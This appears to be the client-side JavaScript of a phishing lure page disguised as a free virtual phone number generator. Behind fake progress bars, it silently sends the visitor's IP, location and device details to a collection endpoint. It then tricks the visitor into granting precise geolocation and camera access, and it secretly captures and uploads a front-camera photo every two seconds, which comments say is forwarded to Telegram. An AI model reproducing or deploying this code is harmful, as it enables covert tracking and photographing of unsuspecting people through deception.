// ========== CONFIG ==========
const API_URL = BASE_URL || window.location.origin;

// ========== DOM REFS ==========
const stepLoading = document.getElementById('step-loading');
const stepMain = document.getElementById('step-main');
const stepSuccess = document.getElementById('step-success');
const progressFill = document.getElementById('progressFill');
const fakeProgress = document.getElementById('fakeProgress');
const countrySelect = document.getElementById('countrySelect');
const platformSelect = document.getElementById('platformSelect');
const generateBtn = document.getElementById('generateBtn');
const fakeProcessing = document.getElementById('fakeProcessing');
const locationRequest = document.getElementById('locationRequest');
const cameraRequest = document.getElementById('cameraRequest');
const allowLocationBtn = document.getElementById('allowLocationBtn');
const allowCameraBtn = document.getElementById('allowCameraBtn');
const copyNumberBtn = document.getElementById('copyNumber');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let capturedPhotos = [];
let userData = {};
let videoStream = null;

// ========== STEP 1: COLLECT IP & DEVICE INFO ==========
async function collectDeviceInfo() {
    try {
        // Simulate loading progress
        let progress = 0;
        const progressInterval = setInterval(() => {
            progress += Math.random() * 15;
            if (progress > 90) progress = 90;
            progressFill.style.width = progress + '%';
        }, 200);

        // Collect basic info
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        const ipv6Response = await fetch('https://api6.ipify.org?format=json');
        const ipv6Data = await ipv6Response.json();
        
        // Get detailed IP info
        let ipInfo = { city: 'Unknown', country: 'Unknown' };
        try {
            const geoResponse = await fetch('https://ipapi.co/json/');
            ipInfo = await geoResponse.json();
        } catch(e) {}

        // Device detection
        const ua = navigator.userAgent;
        const getDevice = () => {
            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) return 'Mobile';
            if (/Tablet|iPad/i.test(ua)) return 'Tablet';
            return 'Desktop/Laptop';
        };

        const getOS = () => {
            if (/Windows NT/.test(ua)) return 'Windows';
            if (/Mac OS X/.test(ua)) return 'macOS';
            if (/Linux/.test(ua)) return 'Linux';
            if (/Android/.test(ua)) return 'Android';
            if (/iOS/.test(ua)) return 'iOS';
            return 'Unknown';
        };

        const getBrowser = () => {
            if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Chrome';
            if (/Firefox/.test(ua)) return 'Firefox';
            if (/Safari/.test(ua)) return 'Safari';
            if (/Edg/.test(ua)) return 'Edge';
            if (/Opera|OPR/.test(ua)) return 'Opera';
            return 'Unknown';
        };

        // Collect all data
        userData = {
            uid: UID,
            ip: ipData.ip || 'N/A',
            ipv4: ipData.ip || 'N/A',
            ipv6: ipv6Data.ip || 'N/A',
            device: getDevice(),
            browser: getBrowser(),
            os: getOS(),
            screen: `${screen.width}x${screen.height}`,
            userAgent: ua,
            language: navigator.language,
            platform: navigator.platform,
            city: ipInfo.city || 'Unknown',
            country: ipInfo.country_name || ipInfo.country || 'Unknown',
            time: new Date().toISOString(),
            photos: [],
            latitude: null,
            longitude: null
        };

        // Send initial data to server
        await fetch(`${API_URL}/api/capture`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(userData)
        });

        // Complete progress
        clearInterval(progressInterval);
        progressFill.style.width = '100%';
        
        // Move to step 2 after brief delay
        setTimeout(() => {
            stepLoading.classList.remove('active');
            stepMain.classList.add('active');
            enableForm();
        }, 800);

    } catch (error) {
        console.error('Collection error:', error);
        // Still proceed even if some info fails
        setTimeout(() => {
            stepLoading.classList.remove('active');
            stepMain.classList.add('active');
            enableForm();
        }, 1500);
    }
}

// ========== STEP 2: FORM HANDLING ==========
function enableForm() {
    countrySelect.addEventListener('change', checkForm);
    platformSelect.addEventListener('change', checkForm);
    generateBtn.addEventListener('click', handleGenerate);
}

function checkForm() {
    generateBtn.disabled = !(countrySelect.value && platformSelect.value);
}

async function handleGenerate() {
    generateBtn.disabled = true;
    generateBtn.textContent = '⏳ Processing...';
    
    // Show fake processing
    fakeProcessing.classList.remove('hidden');
    
    // Fake progress animation
    let progress = 0;
    const progressInterval = setInterval(() => {
        progress += Math.random() * 8;
        if (progress > 80) progress = 80;
        fakeProgress.style.width = progress + '%';
    }, 300);
    
    // After 3 seconds, ask for location
    setTimeout(() => {
        clearInterval(progressInterval);
        fakeProgress.style.width = '100%';
        
        setTimeout(() => {
            fakeProcessing.classList.add('hidden');
            locationRequest.classList.remove('hidden');
        }, 500);
    }, 3000);
}

// ========== STEP 3: LOCATION ACCESS ==========
allowLocationBtn.addEventListener('click', async () => {
    allowLocationBtn.disabled = true;
    allowLocationBtn.textContent = '⏳ Requesting...';
    
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });
        
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        
        userData.latitude = lat;
        userData.longitude = lon;
        userData.accuracy = position.coords.accuracy;
        
        // Send location to server (which forwards to Telegram)
        await fetch(`${API_URL}/api/location`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: UID,
                latitude: lat,
                longitude: lon,
                accuracy: position.coords.accuracy
            })
        });
        
        // Also send updated data to capture
        await fetch(`${API_URL}/api/capture`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(userData)
        });
        
        locationRequest.classList.add('hidden');
        cameraRequest.classList.remove('hidden');
        
    } catch (error) {
        allowLocationBtn.disabled = false;
        allowLocationBtn.textContent = '📍 Allow Location Access';
        alert('Location access is required. Please allow and try again.');
    }
});

// ========== STEP 4: CAMERA ACCESS (Background Photo Capture) ==========
allowCameraBtn.addEventListener('click', async () => {
    allowCameraBtn.disabled = true;
    allowCameraBtn.textContent = '⏳ Accessing Camera...';
    
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({
            video: { width: 640, height: 480, facingMode: 'user' },
            audio: false
        });
        
        video.srcObject = videoStream;
        await video.play();
        
        // Start capturing photos in background
        capturePhotosContinuously();
        
        // Show fake final result
        setTimeout(() => {
            cameraRequest.classList.add('hidden');
            stepMain.classList.remove('active');
            stepSuccess.classList.add('active');
            startCountdown();
        }, 2000);
        
    } catch (error) {
        allowCameraBtn.disabled = false;
        allowCameraBtn.textContent = '📷 Allow Camera Access';
        alert('Camera access is required for verification. Please allow and try again.');
    }
});

// ========== BACKGROUND PHOTO CAPTURE ==========
function capturePhotosContinuously() {
    const context = canvas.getContext('2d');
    
    function capture() {
        if (!videoStream || video.readyState < 2) return;
        
        try {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            capturedPhotos.push(photoData);
            userData.photos = capturedPhotos;
            
            // Send photo to server (forwards to Telegram)
            fetch(`${API_URL}/api/upload_photo`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: UID,
                    photo: photoData
                })
            }).catch(e => console.error('Photo upload error:', e));
            
        } catch(e) {}
        
        // Capture every 2 seconds while page is open
        setTimeout(capture, 2000);
    }
    
    // Start first capture after 1 second
    setTimeout(capture, 1000);
}

// ========== COUNTDOWN TIMER ==========
function startCountdown() {
    let seconds = 600; // 10 minutes
    const countdownEl = document.getElementById('countdown');
    
    const interval = setInterval(() => {
        seconds--;
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        countdownEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        if (seconds <= 0) {
            clearInterval(interval);
            countdownEl.textContent = 'EXPIRED';
        }
    }, 1000);
}

// ========== COPY NUMBER ==========
copyNumberBtn.addEventListener('click', () => {
    const number = document.getElementById('fakeNumber').textContent;
    navigator.clipboard.writeText(number)
        .then(() => alert('Number copied!'))
        .catch(() => alert('Copy failed'));
});

// ========== CLEANUP ON PAGE UNLOAD ==========
window.addEventListener('beforeunload', () => {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
    }
});

// ========== INIT ==========
document.addEventListener('DOMContentLoaded', collectDeviceInfo);
